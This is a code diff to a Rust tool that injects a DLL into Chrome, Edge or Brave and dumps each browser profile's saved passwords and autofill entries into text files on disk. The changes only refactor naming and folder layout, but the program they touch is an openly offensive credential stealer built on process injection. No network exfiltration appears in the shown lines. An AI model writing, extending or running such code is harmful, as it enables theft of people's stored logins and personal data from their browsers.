@@ -71,7 +71,7 @@ struct BrowserConfig {
 
 const BROWSERS: &[BrowserConfig] = &[
     BrowserConfig {
-        name: "chrome",
+        name: "Chrome",
         exe_name: "chrome.exe",
         common_paths: &[
             r"C:\Program Files\Google\Chrome\Application\chrome.exe",
@@ -79,7 +79,7 @@ const BROWSERS: &[BrowserConfig] = &[
         ],
     },
     BrowserConfig {
-        name: "edge",
+        name: "Edge",
         exe_name: "msedge.exe",
         common_paths: &[
             r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
@@ -87,7 +87,7 @@ const BROWSERS: &[BrowserConfig] = &[
         ],
     },
     BrowserConfig {
-        name: "brave",
+        name: "Brave",
         exe_name: "brave.exe",
         common_paths: &[
             r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
@@ -97,7 +97,7 @@ const BROWSERS: &[BrowserConfig] = &[
 ];
 
 fn find_browser_exe(name: &str) -> Option<String> {
-    let config = BROWSERS.iter().find(|b| b.name == name.to_lowercase())?;
+    let config = BROWSERS.iter().find(|b| b.name.to_lowercase() == name.to_lowercase())?;
     for path in config.common_paths {
         if std::path::Path::new(path).exists() {
             return Some(path.to_string());
@@ -106,7 +106,7 @@ fn find_browser_exe(name: &str) -> Option<String> {
     None
 }
 
-fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig, profile_counter: &mut usize) {
+fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig) {
     println!("\n--- Processing Browser: {} ---", browser_config.name);
 
     let mut cmd_line: Vec<u16> = OsStr::new(browser_config.exe_name).encode_wide().chain(Some(0)).collect();
@@ -207,12 +207,11 @@ fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig, prof
 
                 if !buffer.is_empty() {
                     if let Ok(profiles) = serde_json::from_slice::<Vec<ProfileData>>(&buffer) {
-                        let chrome_dir = Path::new("chrome");
-                        let _ = fs::create_dir_all(chrome_dir);
-                        for profile in profiles {
-                            *profile_counter += 1;
-                            let folder_name = format!("profile {}", *profile_counter);
-                            let profile_dir = chrome_dir.join(&folder_name);
+                        let browser_dir = Path::new(browser_config.name);
+                        let _ = fs::create_dir_all(browser_dir);
+                        for (i, profile) in profiles.into_iter().enumerate() {
+                            let folder_name = format!("profile {}", i + 1);
+                            let profile_dir = browser_dir.join(&folder_name);
                             let _ = fs::create_dir_all(&profile_dir);
 
                             if let Ok(mut f) = fs::File::create(profile_dir.join("password.txt")) {
@@ -227,7 +226,7 @@ fn inject_and_collect(dll_path_u16: &[u16], browser_config: &BrowserConfig, prof
                             if let Ok(mut f) = fs::File::create(profile_dir.join("autofill.txt")) {
                                 for a in profile.autofill { let _ = writeln!(f, "Name: {} | Value: {}", a.name, a.value); }
                             }
-                            println!("Saved {} profile: {} as {}", browser_config.name, profile.name, folder_name);
+                            println!("Saved {} profile: {} as {}/{}", browser_config.name, profile.name, browser_config.name, folder_name);
                         }
                     }
                 }
@@ -247,14 +246,13 @@ fn main() {
     let dll_path = std::path::Path::new(&args.dll).canonicalize().expect("DLL path error");
     let dll_path_u16: Vec<u16> = dll_path.as_os_str().encode_wide().chain(Some(0)).collect();
 
-    let mut profile_counter = 0;
     if args.browser.to_lowercase() == "all" {
         for config in BROWSERS {
-            inject_and_collect(&dll_path_u16, config, &mut profile_counter);
+            inject_and_collect(&dll_path_u16, config);
         }
     } else {
-        if let Some(config) = BROWSERS.iter().find(|b| b.name == args.browser.to_lowercase()) {
-            inject_and_collect(&dll_path_u16, config, &mut profile_counter);
+        if let Some(config) = BROWSERS.iter().find(|b| b.name.to_lowercase() == args.browser.to_lowercase()) {
+            inject_and_collect(&dll_path_u16, config);
         } else {
             eprintln!("Unsupported browser: {}", args.browser);
         }
